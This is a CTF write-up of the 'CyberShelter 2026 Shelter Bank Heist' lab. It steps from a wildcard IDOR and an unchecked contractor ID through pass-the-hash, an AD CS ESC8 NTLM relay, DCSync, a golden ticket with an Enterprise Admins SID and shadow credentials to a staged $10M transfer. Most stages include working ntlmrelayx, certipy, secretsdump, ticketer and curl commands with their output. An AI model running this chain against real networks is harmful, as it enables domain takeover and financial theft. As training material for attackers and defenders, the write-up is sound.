

# Hey there!

This is a writeup for the **CyberShelter 2026 — Shelter Bank Heist**, a live
infrastructure CTF where the goal is to move **$10,000,000** from the bank to your
own registered account before the vault closes. It turned into a full AD chain: an old-school IDOR, a broken contractor check, a leaked gMSA, an AD CS ESC8 relay, a child to parent krbtgt forgery, and a shadow credential on the payments service account.

### Challenge Overview

* **Name:** CyberShelter — Shelter Bank Heist
* **Difficulty:** Hard
* **Author:** CyberShelter (GISEC)
* **Description:** The Shelter Bank perimeter (`*.shelter-bank.com`, except the
  registration site). Find what exists, get to the Core Payments Gateway, and settle
  one transfer of up to $10M to your account. "Attribution is the game."
* **Objective:** settle a transfer of up to $10,000,000 to account `5388309353246149`.

***
# بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ

### Part 1: Recon and a Little IDOR

The public perimeter was small: `online.shelter-bank.com` (personal banking),
`remote.shelter-bank.com` / `vpn.shelter-bank.com` (remote access), and the
out-of-scope registration site. The online site had a JS-driven API:

```
POST /api/v1/lookup   { account_no, branch }
```

`account_no` is Luhn-validated (`ERR-1001`), and `branch` is an app-level **glob**
where `*` matches anything. Sending `branch=*` decoupled the account number and
returned a seeded internal record:

```json
{"display_name":"M. OKAFOR","office":"PAYMENTS-NYC","status":"ACTIVE",
 "info":"Onboarding: Payment$Ops2026! (rotate at first login)"}
```

Well, that's one way to leak a password. Any anonymous user can read a payments
employee's onboarding credential just by asking nicely.

### Part 2: The Remote Portal and the Missing Check

The remote portal took `username`, `password`, and a **16-digit `request_id`**
("contractor access request ID"). Surely it's bound to the user, right?

It is not.

```
username=M.OKAFOR  password=Payment$Ops2026!  request_id=1234567890123456  -> 200 dashboard
```

The `request_id` is only checked for *format* (16 digits), never matched to the
account. The dashboard then handed us a downloadable OpenVPN profile:

```
GET /profile/<token>  ->  mb-M.OKAFOR-1234567890123456.ovpn
```

We connected and were on the internal network (`tun0 10.10.90.3`, route `10.10.0.0/16`).

### Part 3: A gMSA Walked Into a Jump Host

With some initial reconnisance i found: `10.10.10.0/24` (web), `10.10.20.0/24`
(servers), `10.10.30.0/24` (a whole second domain), and `10.10.90.0/24` (VPN clients).

`m.okafor` is a member of `Payments-Ops`, and that group is allowed to retrieve the password of a gMSA:

```
svc_jmpmaint$  NT hash : 2aa750e1744dd9b495b55fc95a07b30c
svc_jmpmaint$  AES256  : 8bebeddd9e2dbf72ce7299dcfa1a9deab94d9c1b5d39b65f4d0a8dcf19169c60
```

That account is a local administrator on the jump hosts `JMP01` to `JMP08`, so a quick
Pass-the-Hash using `evil-winrm` gave us the initial foothold that was needed.

### Part 4: Reaching the Second Domain

The root domain controller (`10.10.30.10`) isn't routable from the VPN, but if we use one of the jump
hosts, we can see it. A couple of `netsh interface portproxy` entries exposed its ports to
us:

```
10.10.20.52:88   -> 10.10.30.10:88     (Kerberos)
10.10.20.52:8389 -> 10.10.30.10:389    (LDAP)
10.10.20.52:636  -> 10.10.30.10:636    (LDAPS)
10.10.20.52:8000 -> 10.10.30.10:445    (SMB)
10.10.20.52:8080 -> 10.10.30.10:80     (IIS / certsrv)
```

Cross-realm Kerberos then just worked.

### Part 5: The Two Certificate Authorities

The bank had two CAs, and they were both interesting for the wrong reasons:

* **CORP "Shelter Legacy CA"**  certsrv reachable but it pends every request and it's a standalone self-signed CA that's not in `NTAuthCertificates`. 
* **ROOT "Shelter Enterprise CA"** (`10.10.30.10`) the only NTAuth trusted CA, with
  certsrv web enrollment enabled over plain HTTP, and its `Machine` template grants
  Enroll to CORP Domain Controllers.

[![nzJr3hX.md.png](https://iili.io/nzJr3hX.md.png)](https://freeimage.host/i/nzJr3hX)

### Part 6: ESC8 Relaying a Domain Controller to the CA

To continue: we have to coerce a CORP DC to authenticate to us, relay its NTLM to the ROOT CA's web enrollment, and ask for a Machine cert.

First, the listener. We start `ntlmrelayx` as root, bound to `:445`:

```bash
ntlmrelayx.py -t http://10.10.20.52:8080/certsrv/certfnsh.asp \
    -smb2support --adcs --template Machine --smb-port 445
```
Then, coercion. `coercer` made `DC01$` authenticate to us via EFSRPC.

Finally, the relay. The captured `CORP/DC01$` auth was relayed to the ROOT CA and the
`Machine` template was requested:

```
[*] (SMB): Authenticating connection from CORP/DC01$@10.10.20.10 against http://10.10.20.52:8080 SUCCEED
[*] http://CORP/DC01$@10.10.20.52 [1] -> GOT CERTIFICATE! ID 68
[*] http://CORP/DC01$@10.10.20.52 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
```

A domain controller's certificate, courtesy of a missing EPA config. Nice.

### Part 7: DCSync the Child Domain

```bash
certipy auth -pfx DC01.pfx -dc-ip 10.10.20.10 -domain corp.shelter-bank.com -username 'DC01$'
# [*] Got TGT
# [*] Got hash for 'dc01$@corp.shelter-bank.com': ...:3df09ad1f2988503ba773653d39b....

KRB5CCNAME=dc01.ccache secretsdump.py -k -no-pass -dc-ip 10.10.20.10 -just-dc \
    'corp.shelter-bank.com/DC01$@DC01.corp.shelter-bank.com'
```

After running secretsdump, we got the child domain's keys:

```
krbtgt      NT      aeefb59e8fd1372d4899b25f3e999443
krbtgt AES256       9e7cbf8c8153179ddf1208ec073092608c2a4d638efa26b6cc40584100d4095f
corpadmin   NT      b0ed4d64ddc0244a8cbb07d4c6b6acf2   (Domain Admin)
Administrator NT    51f5e0a075d273c45565670539be62a3
```

### Part 8: Child -> Parent with a Golden Ticket

CORP is a child domain of `SHELTER-BANK.COM`, and the trust has no SID filtering (`trustAttributes = WITHIN_FOREST`). So we forged a AES golden ticket and added the
ROOT Enterprise Admins SID as an extra SID:

```bash
ticketer.py -aesKey 9e7cbf8c8153179ddf1208ec073092608c2a4d638efa26b6cc40584100d4095f \
    -domain-sid S-1-5-21-2246585776-3963567594-1129428140 -domain corp.shelter-bank.com \
    -extra-sid S-1-5-21-231690178-2029500065-3326336826-519 Administrator
```

The cross-realm LDAP ticket to the ROOT DC came from the system Kerberos client, which
happily follows referrals:

```bash
kvno ldap/EC2AMAZ-K4DULIS.shelter-bank.com
# ldap/EC2AMAZ-K4DULIS.shelter-bank.com@CORP… -> Ticket server: …@SHELTER-BANK.COM
```

### Part 9: Shadow Credentials on the Payments Account

As (forged) Enterprise Admin we had `GenericAll` over `svc_swiftbridge`, the service
account that owns the `HTTP/core01` SPN. Instead of resetting its password (which would break the live gateway and make it unfair to other players), I added
a shadow credential.

```bash
certipy shadow -k -no-pass -account svc_swiftbridge \
    -dc-ip 127.0.0.1 -dc-host EC2AMAZ-K4DULIS.shelter-bank.com -ldap-scheme ldaps \
    -target EC2AMAZ-K4DULIS.shelter-bank.com add
# [*] Successfully added Key Credential … -> svc_swiftbridge.pfx

certipy auth -pfx svc_swiftbridge.pfx -dc-ip 127.0.0.1 -domain shelter-bank.com -username svc_swiftbridge
# [*] Got TGT -> svc_swiftbridge.ccache
# [*] Got hash for 'svc_swiftbridge@shelter-bank.com': ...:a387c282df8d8dc24bed30ad478bf2ac
```

> To make the real hostname reachable on a non-routable DC, we added a `127.0.0.1`
> hosts entry and some `socat` forwards into the jump-host relays. `certipy` then did the LDAP write and PKINIT as if the DC were local.

### Part 10: The Heist

With `svc_swiftbridge`'s TGT, the gateway finally liked us:

```bash
curl -k --negotiate -u : https://core01.corp.shelter-bank.com:8443/api/v1/accounts
# [{"account_no":"4000000000000010","holder":"Shelter Alpha Hedge Fund LP"}, … ]

curl -k --negotiate -u : https://core01.corp.shelter-bank.com:8443/api/v1/accounts/4000000000000010
# {"balance":2400000000000}
```

And the transfer:

```bash
curl -k --negotiate -u : -X POST https://core01.corp.shelter-bank.com:8443/api/v1/transfers \
  -H 'Content-Type: application/json' \
  -d '{"source_account":"4000000000000010",
       "beneficiary":"5388309353246149",
       "amount":10000000,"currency":"USD","reference":"CyberShelter heist"}'
```

**HTTP 201:**

```json
{"status":"SETTLED","heist_id":"H-2026-F3B34F",
 "source_account":"4000000000000010","beneficiary":"5388309353246149",
 "amount":10000000,"currency":"USD",
 "source_balance_after":2399990000000,"ledger_ts":"2026-09-17T18:44:59Z"}
```

### The Full Chain

```
anonymous lookup (branch=*) -> M.OKAFOR onboarding password
remote portal (request_id never checked) -> VPN profile -> VPN
VPN -> gMSA svc_jmpmaint$ (Payments-Ops) -> Pass-the-Hash -> admin on JMP01–08
jump-host portproxy -> ROOT DC / ROOT CA reachable
EFSRPC coerce CORP DC01$ + NTLM relay -> ROOT CA Machine template -> DC01.pfx
PKINIT DC01$ -> TGT -> DCSync CORP (krbtgt)
AES golden ticket + ROOT Enterprise Admins SID -> ROOT EA
shadow credential on svc_swiftbridge -> PKINIT -> svc_swiftbridge TGT
POST /api/v1/transfers -> $10,000,000 SETTLED
```

### Conclusion

The "Shelter Bank Heist" was a great example of how a single small logic flaw can
unravel an entire environment. It started with one wildcard and a `request_id` that
nobody checked, and ended with a forged enterprise admin ticket and a $10M settlement.
Every hop was "allowed" on its own, the small holes was what made it possible.

Thanks for reading!

A big thanks to the CyberShelter team for such a fun event.
